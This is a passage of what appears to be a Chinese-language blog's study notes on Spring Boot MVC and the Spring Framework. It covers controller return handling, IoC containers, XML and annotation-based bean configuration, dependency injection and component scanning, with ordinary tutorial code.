自动转为JSON    &#125;&#125;//返回文本数据，不进行视图寻找\n\n@Controller 标记的类默认返回视图名称（需配合 ViewResolver 解析）：\n@Controller // 默认返回视图名public class WebController &#123;    @GetMapping(&quot;/page&quot;)    public String showPage(Model model) &#123;        model.addAttribute(&quot;msg&quot;, &quot;Hello&quot;);        return &quot;page&quot;; // 解析为 templates/page.html    &#125;&#125;//进行视图寻找，至于为什么为templates/page.html，Spring Boot默认的视图解析规则规定了\n\n\n\n通过返回值区分\n\n\n\n返回值类型\n处理方式\n示例\n\n\n\nString\n优先尝试解析为视图名（除非有 @ResponseBody）\nreturn &quot;home&quot;; → 找 home.html\n\n\n非String（如 User）\n强制转为数据（JSON&#x2F;XML等）\nreturn new User(); → 输出JSON\n\n\nModelAndView\n强制走视图渲染\nreturn new ModelAndView(&quot;view&quot;, model);\n\n\nResponseEntity&lt;?&gt;\n强制转为数据\nreturn ResponseEntity.ok(data);\n\n\n可见当没有注解的时候也会优先尝试解析为视图名，找不到再返回文本\n通过内容协商\n我就说每次HTTP请求头中的Accept字段到底是干什么的\nSpring 会根据请求的 Accept 头决定最终响应格式：\nGET /resourceAccept: application/json  # 返回JSON数据Accept: text/html         # 返回HTML视图\n\n我们也可以通过代码支持多种响应格式\n@GetMapping(value = &quot;/resource&quot;, produces = &#123;     MediaType.APPLICATION_JSON_VALUE,     MediaType.TEXT_HTML_VALUE &#125;)public Object getResource() &#123;    if (isApiRequest()) &#123;        return new Data(123); // 返回JSON    &#125; else &#123;        return &quot;page&quot;; // 返回HTML    &#125;&#125;\n\n\n\n强制控制\n我们之前说过可以通过注解去限制返回解析方式，但是我们也可以通过强制控制输出方式来规定解析方式\n强制返回文本数据\n@Controllerpublic class HybridController &#123;    // 方法级别覆盖类级别的@Controller行为    @ResponseBody //通过对方法的注解覆盖类的注解    @GetMapping(&quot;/text&quot;)    public String rawText() &#123;        return &quot;This is raw text&quot;; // 直接输出字符串，不找模板    &#125;&#125;\n\n强制返回视图\n@RestControllerpublic class ApiController &#123;    @GetMapping(&quot;/force-view&quot;)    public ModelAndView forceView() &#123;        return new ModelAndView(&quot;special-page&quot;); // 绕过@RestController    &#125;&#125;//通过ModelAndView绕过@RestController 进行视图解析\n\n\n\n6.项目结构Spring boot中Spring Web也就是MVC的项目结构还是需要注意一下的，我们先来看一下完整的项目结构\nmy-springboot-app/├── src/│   ├── main/│   │   ├── java/  //必须存在的项目结构用于存放.java文件│   │   │   └── com/example/demo/│   │   │       ├── controller/ //路由控制器│   │   │       ├── service/   //业务逻辑层和model一起组成MVC中的M│   │   │       ├── repository/ //数据库操作层，封装 CRUD│   │   │       ├── model/     //用于储存一些实体类和实体和DTO等数据│   │   │       └── DemoApplication.java //Spring boot自带的启动类│   │   └── resources/ //用于存放模板文件，静态资源，和配置文件│   │       ├── application.properties //配置文件，没有就使用默认配置│   │       ├── static/     //静态目录│   │       └── templates/  //用于存放渲染文件的目录│   └── test/  //用于运行测试代码最后不会被打包进行jar│       └── java/│           └── com/example/demo/├── pom.xml└── mvnw / mvnw.cmd\n\nSpring boot对比Spring在很多地方实现了自动化，也不需要那么多配置文件了，只能说现在还用Spring就是有点自找麻烦了，也不需要WEB-INF目录了，Spring boot会在打包的时候创建BOOT-INF\n然后就是resources在打包的时候结构和文件都不会发生变化，打包的时候只会对src目录进行打包，然后将我们项目使用到的jar包存放是lib目录下\ndemo-0.0.1-SNAPSHOT.jar├── META-INF/│   └── MANIFEST.MF├── BOOT-INF/ //用于存放我们项目的打包文件│   ├── classes/│   │   └── com/example/demo/...   ← 你的 Java 类│   ├── lib/│   │   └── *.jar                  ← 所有依赖包│   └── classes/├── org/…                           ← Spring Boot 启动器和 Loader\n\n","tags":["Spring","MVC"]},{"title":"Spring","url":"/2025/07/29/Spring/","content":"Spring前言在学习Spring MVC之前，我想我也得先了解一下Spring的内容。\n虽然之前已经学了一些Java Web的知识，但是Spring的代码好像和Servlet完全不一样感觉变得简单了好多，这些现在还看不懂，还是得慢慢来。\n1.Spring简介Spring指的是Spring Framework，通常我们称之为Spring框架。Spring框架是一个分层的面向切面的Java应用程序的一站式解决框架，它是Spring技术栈的核心和基础，是为了解决企业级引用开发的复杂性而创建的。\n Spring有两个核心模块：IoC和AOP。\n Ioc：Inverse of Control的简写，为 控制反转，指把创建对象交给Spring进行管理。\n AOP：Aspect Oriented Programming 的简写，为 面向切面编程。AOP用来封装多个类的公共行为，将那些与业务无关，却为业务模块共同调用的逻辑封装起来，减少系统的重复代码，降低模块间的耦合度。另外，AOP还解决一些系统层面上的问题，比如日志、事务、权限等。\nSpring Framework的特点\n\n非侵入式：使用 Spring Framework 开发应用程序时，Spring 对应用程序本身的结构影响非常小。对领域模型可以做到零污染；对功能性组件也只需要使用几个简单的注解进行标记，完全不会破坏原有结构，反而能将组件结构进一步简化。这就使得基于 Spring Framework 开发应用程序时结构清晰、简洁优雅。\n\n控制反转：IoC——Inversion of Control，翻转资源获取方向。把自己创建资源、向环境索取资源变成环境将资源准备好，我们享受资源注入。\n\n面向切面编程：AOP——Aspect Oriented Programming，在不修改源代码的基础上增强代码功能。\n\n容器：Spring IoC 是一个容器，因为它包含并且管理组件对象的生命周期。组件享受到了容器化的管理，替程序员屏蔽了组件创建过程中的大量细节，极大的降低了使用门槛，大幅度提高了开发效率。\n\n组件化：Spring 实现了使用简单的组件配置组合成一个复杂的应用。在 Spring 中可以使用 XML 和 Java 注解组合这些对象。这使得我们可以基于一个个功能明确、边界清晰的组件有条不紊的搭建超大型复杂应用系统。\n\n一站式：在 IoC 和 AOP 的基础上可以整合各种企业应用的开源框架和优秀的第三方类库。而且 Spring 旗下的项目已经覆盖了广泛领域，很多方面的功能性需求可以在 Spring Framework 的基础上全部使用 Spring 来实现。\n\n\n2.IoC容器IoC 全称是 Inversion of Control，中文叫 控制反转。\nSpring通过IoC容器来管理所有的Java对象的实例化和初始化，控制着对象与对象之间的依赖关系。我们将由IoC容器管理的Java对象成为 Spring Bean，它与使用关键字 new 创建的Java对象没有任何区别。\n IoC容器是Spring框架中最重要的核心组件之一，它贯穿了Spring从诞生到成长的整个过程。\n也就是说IoC可以用来管理类的实例化，不要像以前那样通过new来实例化，然后我们可以更方便的来处理对象之间的依赖关系，然后用来储存那些类的就是IoC容器，被储存的类需要注册为Bean\n我们先来看下原始的Java Web代码\n// UserService.java - 业务接口public interface UserService &#123;    void sayHello();&#125;// UserServiceImpl.java - 业务实现类public class UserServiceImpl implements UserService &#123;    @Override    public void sayHello() &#123;        System.out.println(&quot;Hello from UserServiceImpl&quot;);    &#125;&#125;// UserController.java - 控制层public class UserController &#123;    // 手动创建依赖对象    private UserService userService = new UserServiceImpl();    public void handleRequest() &#123;        // 调用业务逻辑        userService.sayHello();    &#125;    public static void main(String[] args) &#123;        // 手动 new 控制器        UserController controller = new UserController();        controller.handleRequest();    &#125;&#125;\n\n我们可以看到加载依赖的时候需要单独new一个对象\n这种情况就会导致几个问题\n\n每次使用的时候都需要创建一个对象，这样不仅在多个地方使用依赖的时候会重复占用内存\n如果依赖中还有依赖就需要在new一个对象，如果依赖嵌套的依赖多了就会十分麻烦\n不易测试、替换实现或增加功能。\n\n然后我们如果使用IoC容器的话就可以相同的依赖公用一个内存，然后自动加载依赖也可以实现加载嵌套的依赖\n再看IoC注入代码之前我们需要看一下各个注解\n\n\n\n注解\n作用\n\n\n\n@SpringBootApplication\n启动类注解，包含 @Configuration、@ComponentScan、@EnableAutoConfiguration，启动 IoC 容器\n\n\n@Controller\n标记控制器 Bean（Web 层），让 Spring 扫描并管理\n\n\n@Service\n标记业务层 Bean（Service），让 Spring 扫描并管理\n\n\n@Autowired\n自动注入依赖，容器会查找对应类型的 Bean 并注入\n\n\n@ComponentScan\n指定扫描包路径，Spring 会找到标注注解的类生成 Bean（在 Spring Boot 中已自动包含）\n\n\n然后来看通过IoC进行依赖注入的代码\nimport org.springframework.beans.factory.annotation.Autowired;import org.springframework.stereotype.Controller;import org.springframework.stereotype.Service;import org.springframework.boot.SpringApplication;import org.springframework.boot.autoconfigure.SpringBootApplication;// 1️⃣ 业务接口public interface UserService &#123;    void sayHello();&#125;// 2️⃣ 业务实现类@Service  // 告诉 Spring 这是一个业务层 Beanpublic class UserServiceImpl implements UserService &#123;    @Override    public void sayHello() &#123;        System.out.println(&quot;Hello from UserServiceImpl (Spring IoC)&quot;);    &#125;&#125;// 3️⃣ 控制器@Controller  // 告诉 Spring 这是一个控制层 Beanpublic class UserController &#123;    // 4️⃣ 自动注入依赖    @Autowired  // 告诉 Spring 注入 UserService Bean    private UserService userService;    public void handleRequest() &#123;        userService.sayHello();    &#125;&#125;// 5️⃣ Spring Boot 启动类@SpringBootApplication  // @Configuration + @ComponentScan + @EnableAutoConfigurationpublic class DemoApplication &#123;    public static void main(String[] args) &#123;        // 启动 Spring IoC 容器        var context = SpringApplication.run(DemoApplication.class, args);        // 从容器中获取控制器 Bean        UserController controller = context.getBean(UserController.class);        controller.handleRequest();    &#125;&#125;\n\n我们可以通过IoC容器直接注入对象\n依赖注入\nDI （Dependency Injection）：依赖注入，依赖注入实现了控制反转的思想，是指Spring创建对象的过程中，将对象依赖属性通过配置进行注入。\n依赖注入常见的实现方式有两种：\n\nset注入\n构造注入\n\n所以 IoC 是一种控制反转的思想，而 DI 是对IoC的一种具体实现。\nBean管理：指Bean对象的创建，以及Bean对象中属性的赋值（或Bean对象之间关系的维护）\n1.实现IoC容器Spring中的IoC容器就是IoC思想的一个落地产品实现。IoC容器中管理的组件也叫做bean。在创建bean之前，首先需要创建IoC容器，Spring提供了IoC容器的两种实现方式\n创建IoC容器实际上就是读取我们注册的Bean然后将其放入Spring提供的接口中进行管理，在Spring中创建IoC容器的两个接口就是\n① BeanFactory\n 这是IoC容器的基本实现，是Spring内部使用的接口。面向Spring本身，不提供给开发人员使用。可以使用但是ApplicationContext比其强大太多了\n② ApplicationContext\n BeanFactory的子接口，提供了更多高级特性，面向Spring的使用者，几乎所有场合都使用 ApplicationContext，而不是底层的BeanFactory\n③ ApplicationContext的主要实现类\n\n\n\n类型\n说明\n\n\n\nClassPathXmlApplicationContext\n通过读取类路径下的xml格式配置文件创建IoC容器对象\n\n\nFileSystemApplicationContext\n通过文件系统路径读取xml格式配置文件创建IoC容器对象\n\n\n对于IoC容器的实现有很多种方式，这里只看看最基本的\nBeanFactory factory = new XmlBeanFactory(new ClassPathResource(&quot;beans.xml&quot;));UserService userService = (UserService) factory.getBean(&quot;userService&quot;);//这个几乎没人会用// 读取 XML 配置ApplicationContext context = new ClassPathXmlApplicationContext(&quot;beans.xml&quot;);// 读取注解配置ApplicationContext context = new AnnotationConfigApplicationContext(AppConfig.class);\n\n然后这个代码中AppConfig.class实际上就是一个用Java来写xml\nimport org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;@Configuration  // 告诉 Spring：这是一个配置类（相当于 XML 配置文件）public class AppConfig &#123;    @Bean  // 相当于 &lt;bean id=&quot;userService&quot; class=&quot;com.example.UserService&quot;/&gt;    public UserService userService() &#123;        return new UserService();    &#125;&#125;\n\n\n\n然后我们获取到的ApplicationContext对象就是一个用来储存Bean的键值对，然后有各种方法可以用来管理Bean\n然后我们就可以通过getBean获取类\n获取bean方式\n\n根据id获取\n  id属性是bean的唯一标识，所以根据bean标签的id属性可以精确获取到一个组件对象。\n\n根据类型获取\n\n根据id和类型获取\n\n\nbean.xml\n&lt;bean id=&quot;user&quot; class=&quot;cn.tedu.spring.iocxml.User&quot;&gt;&lt;/bean&gt;\n\nUserTest.java\npublic class UserTest &#123;    public static void main(String[] args) &#123;        // 1.加载配置文件        ApplicationContext context = new ClassPathXmlApplicationContext(&quot;bean.xml&quot;);        // 2.根据id获取bean        User user1 = (User) context.getBean(&quot;user&quot;);        System.out.println(&quot;1-根据id获取对象:&quot; + user1);        user1.userMethod();        //3.根据类型获取，可以不需要进行类型转化，但是在遇到配置了两个同类型的bean时会报错        User user2 = context.getBean(User.class);        System.out.println(&quot;2-根据类型获取bean:&quot; + user2);        user2.userMethod();        //4.根据id和类型获取，用于同类型有两个bean，同时还因为有类型，不需要进行类型转换        User user3 = context.getBean(&quot;user&quot;, User.class);        System.out.println(&quot;3-根据id和类型获取bean：&quot; + user3);        user3.userMethod();    &#125;&#125;\n\n\n\n\n\n3.基于XML管理bean我们可以通过IoC容器不通过实例化直接获取到对应的类，其中重要的在于要将类注册为Bean(即让容器管理它的生命周期和依赖注入)\n1.bean.xml配置这个就简单理解一点了，就是像之前那样直接在bean.xml文件中那样配置然后使用的时候解析即可，但是由于每个类都需要单独注册，还要自己写上路径实在太麻烦已经很少用了\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;    xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;    xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans        https://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;    &lt;bean id=&quot;userService&quot; class=&quot;com.itranswarp.learnjava.service.UserService&quot;&gt;        &lt;property name=&quot;mailService&quot; ref=&quot;mailService&quot; /&gt;    &lt;/bean&gt;    &lt;bean id=&quot;mailService&quot; class=&quot;com.itranswarp.learnjava.service.MailService&quot; /&gt;&lt;/beans&gt;\n\n注意观察上述配置文件，其中与XML Schema相关的部分格式是固定的，我们只关注两个&lt;bean ...&gt;的配置：\n\n每个&lt;bean ...&gt;都有一个id标识，相当于Bean的唯一ID；\n在userServiceBean中，通过&lt;property name=&quot;...&quot; ref=&quot;...&quot; /&gt;注入了另一个Bean；\nBean的顺序不重要，Spring根据依赖关系会自动正确初始化。\n\n把上述XML配置文件用Java代码写出来，就像这样：\nUserService userService = new UserService();MailService mailService = new MailService();userService.setMailService(mailService);\n\n只不过Spring容器是通过读取XML文件后使用反射完成的。\n如果注入的不是Bean，而是boolean、int、String这样的数据类型，则通过value注入，例如，创建一个HikariDataSource：\n&lt;bean id=&quot;dataSource&quot; class=&quot;com.zaxxer.hikari.HikariDataSource&quot;&gt;    &lt;property name=&quot;jdbcUrl&quot; value=&quot;jdbc:mysql://localhost:3306/test&quot; /&gt;    &lt;property name=&quot;username&quot; value=&quot;root&quot; /&gt;    &lt;property name=&quot;password&quot; value=&quot;password&quot; /&gt;    &lt;property name=&quot;maximumPoolSize&quot; value=&quot;10&quot; /&gt;    &lt;property name=&quot;autoCommit&quot; value=&quot;true&quot; /&gt;&lt;/bean&gt;\n\n原来Bean不止能用来方便创建对象，还可以方便依赖注入和初始化\n2.IoC容器的加载ClassPathXlApplicationContext\n然后就是加载了，获取上下文然后通过getBean获取对象，但是获取到的是Object类型，需要进行强制类型转换\nApplicationContext context = new ClassPathXmlApplicationContext(&quot;bean.xml&quot;);//通过ClassPathXmlApplicationContext解析解xml文件，加载bean     User user1 = (User) context.getBean(&quot;user&quot;);System.out.println(&quot;1-根据id获取对象:&quot; + user1);user1.userMethod();\n\n这个简单是简单就是麻烦不能自动注册\n可以看到，Spring容器就是ApplicationContext，它是一个接口，有很多实现类，这里我们选择ClassPathXmlApplicationContext，表示它会自动从classpath中查找指定的XML配置文件。\n获得了ApplicationContext的实例，就获得了IoC容器的引用。从ApplicationContext中我们可以根据Bean的ID获取Bean，但更多的时候我们根据Bean的类型获取Bean的引用：\nUserService userService = context.getBean(UserService.class);\n\n\n\nBeanFactory\nSpring还提供另一种IoC容器叫BeanFactory，使用方式和ApplicationContext类似：\nBeanFactory factory = new XmlBeanFactory(new ClassPathResource(&quot;application.xml&quot;));MailService mailService = factory.getBean(MailService.class);\n\nBeanFactory和ApplicationContext的区别在于，BeanFactory的实现是按需创建，即第一次获取Bean时才创建这个Bean，而ApplicationContext会一次性创建所有的Bean。实际上，ApplicationContext接口是从BeanFactory接口继承而来的，并且，ApplicationContext提供了一些额外的功能，包括国际化支持、事件和通知机制等。通常情况下，我们总是使用ApplicationContext，很少会考虑使用BeanFactory。\n然后就是之前我疑惑的一个地方了，既然通过Bean加载类需要IoC容器，包括其他操作。如果每用到一次getBean就需要加载一次IoC容器，那内存消耗就会十分恐怖，这样的写法也是违背了Spring的初心的\n于是我们只需要在入口主类中加载一次，后续在运行的时候都可以访问到这个静态全局对象，不需要重复加载，然后只需要IoC容器启动了且在生命周期中，注解就可以自动行使作用\npublic class Main &#123;    public static void main(String[] args) &#123;        // 创建一次容器        //ApplicationContext context = new AnnotationConfigApplicationContext(AppConfig.class);        //这个是基于java的配置文件进行bean的配置，这个class文件实际上就是使用java去写xml        ApplicationContext context = new ClassPathXmlApplicationContext(&quot;bean.xml&quot;);        // 取出 Bean        UserService userService = context.getBean(UserService.class);        userService.sayHello();    &#125;&#125;\n\n然后Spring boot就更加简单了，会自动创建IoC容器\nimport org.springframework.boot.SpringApplication;import org.springframework.boot.autoconfigure.SpringBootApplication;@SpringBootApplication public class MyApplication &#123;    public static void main(String[] args) &#123;        SpringApplication.run(MyApplication.class, args);//创建IoC容器，然后加载配置文件 虽然现在还不知道spring boot怎么使用bean    &#125;&#125;\n\n这里面的配置文件主要是为了一些第三方类和一些项目结构不在主类包中的类注册Bean\n然后就是Spring boot中这样创建IoC容器是不会有可以操作的对象的，也就是不能执行像getBean这种方法，我们想要获取注册了的类就需要通过注解\n@Autowiredprivate UserService userService; // Spring 自动注入\n\n\n\n3.Bean的获取方式我们既然可以加载IoC容器了，我们就可以获取Bean了，我们还是总结一下Bean的获取方式\n1.通过id获取\n我们在xml中注册为Bean的时候每一个Bean都需要提供的唯一的id\n@Testpublic void testHelloWorld1()&#123;\tApplicationContext ac = new ClassPathXmlApplicationContext(&quot;beans.xml&quot;);    HelloWorld bean = ac.getBean(HelloWorld.class);    bean.sayHello();&#125;\n\n\n\n2.通过类型获取\n类型就是我们注册为Bean的那个文件\nHelloWorld bean = ac.getBean(HelloWorld.class);\n\n\n\n3.通过id和类型获取\n感觉除了增加代码量没什么用了\nHelloWorld bean = ac.getBean(&quot;helloworld&quot;, HelloWorld.class);\n\n\n\n4.依赖注入之setter注入我们之前在看bean.xml的时候就发现了我们在依赖和进行依赖注入的类都注册后可以通过添加&lt;property&gt;标签可以注入类和属性\n我们使用setter注入，顾名思义就是使用set方法进行注入，我们得先在我们的类中写上set方法，其中set方法对类中属性进行赋值\npublic class CustomerService &#123;    private CustomerDao customerDao;    private String region;        // Setter 方法    public void setCustomerDao(CustomerDao customerDao) &#123;        this.customerDao = customerDao;    &#125;        public void setRegion(String region) &#123;        this.region = region;    &#125;&#125;\n\nxml配置\n&lt;bean id=&quot;customerDao&quot; class=&quot;com.example.CustomerDaoImpl&quot; /&gt;&lt;bean id=&quot;customerService&quot; class=&quot;com.example.CustomerService&quot;&gt;    &lt;!-- 注入其他 Bean --&gt;    &lt;property name=&quot;customerDao&quot; ref=&quot;customerDao&quot; /&gt;    &lt;!-- 注入基本值 --&gt;    &lt;property name=&quot;region&quot; value=&quot;Asia&quot; /&gt;&lt;/bean&gt;\n\n感觉就是会自动调用我们的set方法，如果依赖注入类的话就需要使用ref字段，如果只是其他基础数据类型就通过value传值就行了\n5.依赖注入之构造器注入构造器注入在bean.xml中使用的是&lt;constructor-arg&gt;标签\n既然名字都有构造了，那肯定和我们的构造函数不远了。setter依赖注入使用的是set方法，构造器注入利用的就是类的构造函数\npublic class OrderService &#123;    private PaymentService paymentService;    private ShippingService shippingService;    private int maxRetry;        public OrderService(PaymentService ps, ShippingService ss, int maxRetry) &#123;        this.paymentService = ps;        this.shippingService = ss;        this.maxRetry = maxRetry;    &#125;&#125;\n\n然后对于参数的传递，既可以，而是可以通过参数顺序，参数名称，以及参数索引进行配置\n&lt;!-- XML 配置 --&gt;&lt;bean id=&quot;paymentService&quot; class=&quot;com.example.PaymentServiceImpl&quot; /&gt;&lt;bean id=&quot;shippingService&quot; class=&quot;com.example.ShippingServiceImpl&quot; /&gt;&lt;bean id=&quot;orderService&quot; class=&quot;com.example.OrderService&quot;&gt;    &lt;!-- 按顺序注入 --&gt;    &lt;constructor-arg ref=&quot;paymentService&quot; /&gt;    &lt;constructor-arg ref=&quot;shippingService&quot; /&gt;    &lt;constructor-arg value=&quot;3&quot; /&gt;  &lt;!-- 基本类型值 --&gt;&lt;/bean&gt;&lt;!-- 或按名称注入（更清晰） --&gt;&lt;bean id=&quot;orderService&quot; class=&quot;com.example.OrderService&quot;&gt;    &lt;constructor-arg name=&quot;ps&quot; ref=&quot;paymentService&quot; /&gt;    &lt;constructor-arg name=&quot;ss&quot; ref=&quot;shippingService&quot; /&gt;    &lt;constructor-arg name=&quot;maxRetry&quot; value=&quot;3&quot; /&gt;&lt;/bean&gt;&lt;!-- 或按类型索引注入 --&gt;&lt;bean id=&quot;orderService&quot; class=&quot;com.example.OrderService&quot;&gt;    &lt;constructor-arg index=&quot;0&quot; ref=&quot;paymentService&quot; /&gt;    &lt;constructor-arg index=&quot;1&quot; ref=&quot;shippingService&quot; /&gt;    &lt;constructor-arg index=&quot;2&quot; value=&quot;3&quot; /&gt;&lt;/bean&gt;\n\n\n\n\n\n6.属性赋值的特殊方法1.内部bean\n&lt;bean id=&quot;studentFour&quot; class=&quot;com.atguigu.spring6.bean.Student&quot;&gt;    &lt;property name=&quot;id&quot; value=&quot;1004&quot;&gt;&lt;/property&gt;    &lt;property name=&quot;name&quot; value=&quot;赵六&quot;&gt;&lt;/property&gt;    &lt;property name=&quot;age&quot; value=&quot;26&quot;&gt;&lt;/property&gt;    &lt;property name=&quot;sex&quot; value=&quot;女&quot;&gt;&lt;/property&gt;    &lt;property name=&quot;clazz&quot;&gt;        &lt;!-- 在一个bean中再声明一个bean就是内部bean --&gt;        &lt;!-- 内部bean只能用于给属性赋值，不能在外部通过IOC容器获取，因此可以省略id属性 --&gt;        &lt;bean id=&quot;clazzInner&quot; class=&quot;com.atguigu.spring6.bean.Clazz&quot;&gt;            &lt;property name=&quot;clazzId&quot; value=&quot;2222&quot;&gt;&lt;/property&gt;            &lt;property name=&quot;clazzName&quot; value=&quot;远大前程班&quot;&gt;&lt;/property&gt;        &lt;/bean&gt;    &lt;/property&gt;&lt;/bean&gt;\n\n我们看到内部bean也是使用property标签，然后里面再写一个bean标签指向类，然后赋值给name字段指向的属性。\n2.级联属性赋值\n这个就是可以通过name字段指定属性对象的属性进行依赖注入\n&lt;bean id=&quot;studentFour&quot; class=&quot;com.atguigu.spring6.bean.Student&quot;&gt;    &lt;property name=&quot;id&quot; value=&quot;1004&quot;&gt;&lt;/property&gt;    &lt;property name=&quot;name&quot; value=&quot;赵六&quot;&gt;&lt;/property&gt;    &lt;property name=&quot;age&quot; value=&quot;26&quot;&gt;&lt;/property&gt;    &lt;property name=&quot;sex&quot; value=&quot;女&quot;&gt;&lt;/property&gt;    &lt;property name=&quot;clazz&quot; ref=&quot;clazzOne&quot;&gt;&lt;/property&gt;    &lt;property name=&quot;clazz.clazzId&quot; value=&quot;3333&quot;&gt;&lt;/property&gt;    &lt;property name=&quot;clazz.clazzName&quot; value=&quot;最强王者班&quot;&gt;&lt;/property&gt;&lt;/bean&gt;\n\n\n\n3.为数组属性赋值\nprivate String[] hobbies;public String[] getHobbies() &#123;    return hobbies;&#125;public void setHobbies(String[] hobbies) &#123;    this.hobbies = hobbies;&#125;\n\n可以使用array和value字段\n&lt;bean id=&quot;studentFour&quot; class=&quot;com.atguigu.spring.bean6.Student&quot;&gt;    &lt;property name=&quot;id&quot; value=&quot;1004&quot;&gt;&lt;/property&gt;    &lt;property name=&quot;name&quot; value=&quot;赵六&quot;&gt;&lt;/property&gt;    &lt;property name=&quot;age&quot; value=&quot;26&quot;&gt;&lt;/property&gt;    &lt;property name=&quot;sex&quot; value=&quot;女&quot;&gt;&lt;/property&gt;    &lt;property name=&quot;clazz&quot; ref=&quot;clazzOne&quot;&gt;&lt;/property&gt;    &lt;property name=&quot;hobbies&quot;&gt;        &lt;array&gt;            &lt;value&gt;抽烟&lt;/value&gt;            &lt;value&gt;喝酒&lt;/value&gt;            &lt;value&gt;烫头&lt;/value&gt;        &lt;/array&gt;    &lt;/property&gt;&lt;/bean&gt;\n\n\n\n4.为集合属性赋值\nJava中还有一个特殊的数据类型，集合。然后集合又主要有两种，List和Map。区别在于Map是键值对，除了值还有键，List只有下标。\n1.为List集合属性赋值\nprivate List&lt;Student&gt; students;public List&lt;Student&gt; getStudents() &#123;    return students;&#125;public void setStudents(List&lt;Student&gt; students) &#123;    this.students = students;&#125;\n\n我们可以使用list标签，里面再放入ref或value标签，这里使用的是构造器注入\n配置xml\n&lt;bean id=&quot;clazzTwo&quot; class=&quot;com.atguigu.spring6.bean.Clazz&quot;&gt;    &lt;property name=&quot;clazzId&quot; value=&quot;4444&quot;&gt;&lt;/property&gt;    &lt;property name=&quot;clazzName&quot; value=&quot;Javaee0222&quot;&gt;&lt;/property&gt;    &lt;property name=&quot;students&quot;&gt;        &lt;list&gt;            &lt;ref bean=&quot;studentOne&quot;&gt;&lt;/ref&gt;            &lt;ref bean=&quot;studentTwo&quot;&gt;&lt;/ref&gt;            &lt;ref bean=&quot;studentThree&quot;&gt;&lt;/ref&gt;        &lt;/list&gt;    &lt;/property&gt;&lt;/bean&gt;\n\n若为Set集合类型属性赋值，只需要将其中的list标签改为set标签即可\n2.为Map集合类型属性赋值\n// Java 类public class ConfigService &#123;    private Map&lt;String, String&gt; settings;        public void setSettings(Map&lt;String, String&gt; settings) &#123;        this.settings = settings;    &#125;&#125;\n\nMap使用的是map和entry标签\n&lt;bean id=&quot;configService&quot; class=&quot;com.example.ConfigService&quot;&gt;    &lt;property name=&quot;settings&quot;&gt;        &lt;map&gt;            &lt;!-- 字符串键值对 --&gt;            &lt;entry key=&quot;app.name&quot; value=&quot;MyApplication&quot; /&gt;            &lt;entry key=&quot;app.version&quot; value=&quot;1.0.0&quot; /&gt;            &lt;entry key=&quot;database.url&quot; value=&quot;jdbc:mysql://localhost:3306/test&quot; /&gt;            &lt;entry key=&quot;database.username&quot; value=&quot;root&quot; /&gt;            &lt;entry key=&quot;database.password&quot; value=&quot;123456&quot; /&gt;            &lt;entry key=&quot;cache.enabled&quot; value=&quot;true&quot; /&gt;            &lt;entry key=&quot;cache.size&quot; value=&quot;1000&quot; /&gt;        &lt;/map&gt;    &lt;/property&gt;&lt;/bean&gt;\n\n\n\n\n\n\n\n\n\n\n\n4.基于注解管理Bean我们之前在通过xml进行配置的时候就使用过class文件也可以用来配置bean\n使用XML配置的优点是所有的Bean都能一目了然地列出来，并通过配置注入能直观地看到每个Bean的依赖。它的缺点是写起来非常繁琐，每增加一个组件，就必须把新的Bean配置到XML中。\n有没有其他更简单的配置方式呢？\n有！我们可以使用Annotation配置，可以完全不需要XML，让Spring自动扫描Bean并组装它们。\n我们把上一节的示例改造一下，先删除XML配置文件，然后，给UserService和MailService添加几个注解。\n首先，我们给MailService添加一个@Component注解：\n@Componentpublic class MailService &#123;    ...&#125;\n\n这个@Component注解就相当于定义了一个Bean，它有一个可选的名称，默认是mailService，即小写开头的类名。\n然后，我们给UserService添加一个@Component注解和一个@Autowired注解：\n@Componentpublic class UserService &#123;    @Autowired    MailService mailService;    ...&#125;\n\n\n\n\n\n1.开启组件扫描1.使用xml配置明明可以是用注解方便的扫描，但是却也可以使用xml配置。都使用注解去注册Bean了，还去加载xml文件是不是有点麻烦了\nSpring 默认不使用注解装配 Bean，因此我们需要在 Spring 的 XML 配置中，通过 &lt;context:component-scan&gt; 元素开启 Spring Beans的自动扫描功能。开启此功能后，Spring 会自动从扫描指定的包（base-package 属性设置）及其子包下的所有类，如果类上使用了 @Component 注解，就将该类装配到容器中。\n我们在beans标签中写上\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;       xmlns:context=&quot;http://www.springframework.org/schema/context&quot;       xsi:schemaLocation=&quot;           http://www.springframework.org/schema/beans           http://www.springframework.org/schema/beans/spring-beans.xsd           http://www.springframework.org/schema/context           http://www.springframework.org/schema/context/spring-context.xsd&quot;&gt;        &lt;!-- 启用组件扫描 --&gt;    &lt;context:component-scan base-package=&quot;com.example&quot; /&gt;    &lt;/beans&gt;\n\n注意：在使用 &lt;context:component-scan&gt; 元素开启自动扫描功能前，首先需要在 XML 配置的一级标签 &lt;beans&gt; 中添加 context 相关的约束。\n通过xml配置组件扫描和使用注解进行配置完全等效，现在主要使用注解配置\n2.@ComponentScan注解配置我们可以在使用@ComponentScan修饰一个类然后配合@Configuration即可将这个类作为控制组件扫描的配置类了\n基本用法\n// 最简单的使用方式@Configuration//将这个类作为配置类@ComponentScan  // 默认扫描当前类所在包及其子包public class AppConfig &#123;&#125;\n\n我们可以通过包名来指定扫描，通过往注解后面的括号中写包名\n// 扫描单个包@Configuration@ComponentScan(&quot;com.example.service&quot;)public class ServiceConfig &#123; &#125;// 扫描多个包（数组形式）@Configuration@ComponentScan(&#123;&quot;com.example.service&quot;, &quot;com.example.dao&quot;, &quot;com.example.web&quot;&#125;)public class AppConfig &#123; &#125;// 扫描多个包（字符串形式）@Configuration@ComponentScan(basePackages = &quot;com.example.service, com.example.dao&quot;)public class AppConfig &#123; &#125;\n\n然后过滤器这个东西，我感觉我一个学网安的没必要全部都看一遍，学一下按照注释过滤就行了\n// 扫描特定注解@ComponentScan(    includeFilters = @Filter(type = FilterType.ANNOTATION,                            classes = &#123;                               Service.class,                               Repository.class,                               CustomAnnotation.class                           &#125;))//只扫描带有@Service @Repository @CustomAnnotation注解的类，其中@CustomAnnotation为自定义注解// 自定义注解示例@Target(ElementType.TYPE)@Retention(RetentionPolicy.RUNTIME)@Component  // 